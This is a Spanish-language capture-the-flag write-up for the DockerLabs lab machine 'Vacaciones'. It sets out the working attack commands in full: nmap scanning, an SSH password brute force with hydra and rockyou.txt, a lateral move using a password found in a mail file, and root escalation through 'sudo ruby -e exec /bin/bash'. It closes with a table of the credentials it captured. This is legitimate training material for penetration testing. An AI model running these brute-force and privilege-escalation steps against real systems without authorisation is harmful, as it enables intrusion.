# Máquina: Vacaciones — DockerLabs

**Dificultad:** Muy fácil  
**SO:** Ubuntu Linux  
**IP objetivo:** `172.17.0.2`  
**Técnicas:** Enumeración web · Fuerza bruta SSH · Pivote de usuarios · Escalada con sudo ruby

---

## Flujo del ataque

```
Ping → Nmap (SSH + HTTP) → curl (usuarios: juan y camilo) → Hydra (camilo)
→ SSH → /var/mail (contraseña de juan) → su juan → sudo ruby → root
```

---

## 1. Reconocimiento

### Ping

```bash
ping -c 2 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.136 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.096 ms
```

TTL = 64 → Sistema Linux confirmado.

### Nmap

```bash
sudo nmap -sS -sC -sV -p- --min-rate 5000 -n -Pn -vvv -oN scan 172.17.0.2
```

| Puerto | Estado | Servicio | Versión                      |
|--------|--------|----------|------------------------------|
| 22/tcp | open   | SSH      | OpenSSH 7.6p1 Ubuntu         |
| 80/tcp | open   | HTTP     | Apache httpd 2.4.29 (Ubuntu) |

---

## 2. Enumeración web

```bash
curl -i http://172.17.0.2
```

```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

Dos usuarios identificados en el comentario HTML: `juan` y `camilo`. El mensaje va dirigido a Camilo, así que es el primer objetivo.

---

## 3. Acceso inicial — Fuerza bruta SSH sobre camilo

```bash
hydra -l camilo -P ~/Desktop/Lists/Rockyou/rockyou.txt -V ssh://172.17.0.2 -t 4
```

```
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
```

```bash
ssh camilo@172.17.0.2
# Password: password1
```

Una vez dentro mejoramos la terminal para habilitar una TTY completa (necesaria para comandos como `su`):

```bash
script /dev/null -c bash
```

---

## 4. Pivote lateral — camilo → juan

`camilo` no tiene permisos de sudo:

```bash
sudo -l
# Sorry, user camilo may not run sudo on 6ef74c104c6c.
```

La página web mencionaba un correo importante. Revisamos el directorio de correos del sistema:

```bash
cat /var/mail/camilo/correo.txt
```

```
Hola Camilo,
Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.
Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

```bash
su juan
# Password: 2k84dicb
```

```
uid=1000(juan) gid=1000(juan) groups=1000(juan)
```

---

## 5. Escalada de privilegios — juan → root

```bash
script /dev/null -c bash
sudo -l
```

```
User juan may run the following commands on 6ef74c104c6c:
    (ALL) NOPASSWD: /usr/bin/ruby
```

`juan` puede ejecutar `ruby` como root sin contraseña. Usamos `exec` para lanzar una bash heredando esos privilegios:

```bash
sudo ruby -e 'exec "/bin/bash"'
```

```
root@6ef74c104c6c:/home/camilo# id
uid=0(root) gid=0(root) groups=0(root)
```

Referencia: [GTFOBins — ruby](https://gtfobins.github.io/gtfobins/ruby/)

---

## Credenciales

| Usuario | Contraseña | Método                          |
|---------|------------|---------------------------------|
| camilo  | password1  | Hydra + rockyou.txt             |
| juan    | 2k84dicb   | /var/mail/camilo/correo.txt     |
| root    | —          | sudo ruby -e 'exec "/bin/bash"' |
